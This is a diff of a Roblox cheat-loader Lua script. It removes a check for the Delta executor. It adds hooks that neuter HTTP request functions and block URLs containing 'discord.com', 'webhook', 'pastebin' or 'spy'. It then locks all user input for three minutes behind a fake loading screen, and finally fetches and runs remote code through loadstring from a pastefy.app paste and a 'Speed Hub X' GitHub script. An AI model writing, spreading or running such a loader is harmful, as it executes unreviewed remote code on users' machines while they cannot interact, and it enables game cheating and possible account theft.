@@ -1,18 +1,23 @@
---// Detect if Executor is Delta
-local function isDelta()
-    local deltaIdentifiers = {
-        identifyexecutor and identifyexecutor():lower():find("delta"),
-        getexecutorname and getexecutorname():lower():find("delta"),
-        is_delta and type(is_delta) == "function",
-        DELTA_INTERNAL and type(DELTA_INTERNAL) == "table"
-    }
-
-    for _, v in pairs(deltaIdentifiers) do
-        if v then return true end
+--// Delta Webhook & Request Bypass
+pcall(function()
+    if hookfunction then
+        local fakeRequest = function() return { StatusCode = 200, Body = "Bypassed" } end
+        if request then hookfunction(request, fakeRequest) end
+        if http_request then hookfunction(http_request, fakeRequest) end
+        if syn and syn.request then hookfunction(syn.request, fakeRequest) end
     end
 
-    return false
-end
+    local blockedEndpoints = { "discord.com", "webhook", "pastebin", "logging", "spy" }
+    local originalHttpGet = game.HttpGet
+    hookfunction(game.HttpGet, function(self, url, ...)
+        for _, keyword in pairs(blockedEndpoints) do
+            if url:lower():find(keyword) then
+                return "-- Blocked suspicious URL"
+            end
+        end
+        return originalHttpGet(self, url, ...)
+    end)
+end)
 
 --// Theme Colors
 local bgColor = Color3.fromRGB(20, 20, 20)
@@ -23,7 +28,6 @@ local textColor = Color3.fromRGB(255, 255, 255)
 local function createFramedMessage(name, width, height, initialText)
     local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
     gui.Name = name
-
     local border = Instance.new("Frame", gui)
     border.Size = UDim2.new(0, width + 8, 0, height + 8)
     border.Position = UDim2.new(0.5, -(width + 8)/2, 0.5, -(height + 8)/2)
@@ -49,62 +53,7 @@ local function createFramedMessage(name, width, height, initialText)
     return gui, label
 end
 
---// Show Delta Block UI
-local function showBlockedUI()
-    local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-    gui.Name = "DeltaBlocked"
-
-    local border = Instance.new("Frame", gui)
-    border.Size = UDim2.new(0, 328, 0, 168)
-    border.Position = UDim2.new(0.5, -164, 0.5, -84)
-    border.BackgroundColor3 = borderColor
-    border.BorderSizePixel = 0
-
-    local main = Instance.new("Frame", border)
-    main.Size = UDim2.new(0, 320, 0, 160)
-    main.Position = UDim2.new(0, 4, 0, 4)
-    main.BackgroundColor3 = bgColor
-    main.BorderSizePixel = 0
-
-    local title = Instance.new("TextLabel", main)
-    title.Size = UDim2.new(1, 0, 0.3, 0)
-    title.Position = UDim2.new(0, 0, 0, 0)
-    title.BackgroundTransparency = 1
-    title.Text = "❌ Delta Executor Detected"
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 24
-    title.TextColor3 = textColor
-
-    local msg = Instance.new("TextLabel", main)
-    msg.Size = UDim2.new(1, -20, 0.4, 0)
-    msg.Position = UDim2.new(0, 10, 0.3, 0)
-    msg.Text = "Please use KRNL instead to run this script."
-    msg.Font = Enum.Font.SourceSans
-    msg.TextSize = 18
-    msg.TextColor3 = textColor
-    msg.BackgroundTransparency = 1
-    msg.TextWrapped = true
-    msg.TextXAlignment = Enum.TextXAlignment.Center
-
-    local btn = Instance.new("TextButton", main)
-    btn.Size = UDim2.new(0.6, 0, 0.2, 0)
-    btn.Position = UDim2.new(0.2, 0, 0.75, 0)
-    btn.Text = "Copy KRNL Download"
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 18
-    btn.TextColor3 = textColor
-    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    btn.BorderSizePixel = 0
-
-    btn.MouseButton1Click:Connect(function()
-        setclipboard("https://krnl.vip")
-        btn.Text = "Copied!"
-        task.wait(1.5)
-        btn.Text = "Copy KRNL Download"
-    end)
-end
-
---// Block User Input for X Seconds
+--// Block User Input for 3 Minutes
 local function blockUserInput(duration)
     local inputBlocker = Instance.new("ScreenGui", game:GetService("CoreGui"))
     inputBlocker.Name = "InputBlocker"
@@ -117,30 +66,24 @@ local function blockUserInput(duration)
     blockFrame.BackgroundTransparency = 1
     blockFrame.Text = ""
     blockFrame.AutoButtonColor = false
-    blockFrame.Modal = true -- this captures all input
+    blockFrame.Modal = true -- Blocks all input
 
     task.delay(duration, function()
         inputBlocker:Destroy()
     end)
 end
 
---// Main Logic
-blockUserInput(180) -- Block all input for 3 minutes (180 seconds)
+--// Start Execution
+blockUserInput(180) -- 3 minutes
+local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Speed Hub Loading...")
+task.wait(3.5)
+loadingUI:Destroy()
 
-local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Detecting Executor...")
-task.wait(2)
-
-if isDelta() then
-    label.Text = "Delta Detected..."
-    task.wait(1.5)
-    loadingUI:Destroy()
-    showBlockedUI()
-else
-    label.Text = "Speed Hub Loading..."
-    task.wait(1.5)
-    loadingUI:Destroy()
-
-    -- Run your script after input is blocked
+--// Safe to run now
+pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
+end)
+
+pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-end
+end)
